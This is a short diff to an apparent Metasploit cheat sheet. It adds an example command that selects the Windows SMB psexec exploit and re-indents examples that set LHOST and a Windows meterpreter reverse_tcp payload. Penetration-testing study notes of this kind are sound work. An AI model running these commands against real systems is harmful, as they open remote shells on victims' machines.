@@ -191,12 +191,13 @@ exploit
   - searches exploits, payloads, and other tools for the given string
 - `set`
   - can be used to set the options for the exploit & payload, or used to choose which payload to send
-  - `set LHOST 10.10.75.1`
-  - `set PAYLOAD windows/meterpreter/reverse_tcp`
+    - `set LHOST 10.10.75.1`
+    - `set PAYLOAD windows/meterpreter/reverse_tcp`
 - `show options`
   - shows the options as currently configured
 - `use`
   - sets the exploit
+    - `use exploit/windows/smb/psexec`
 
 ### meterpreter <!-- omit in toc -->
   - `background` puts the current meterpreter session in the background
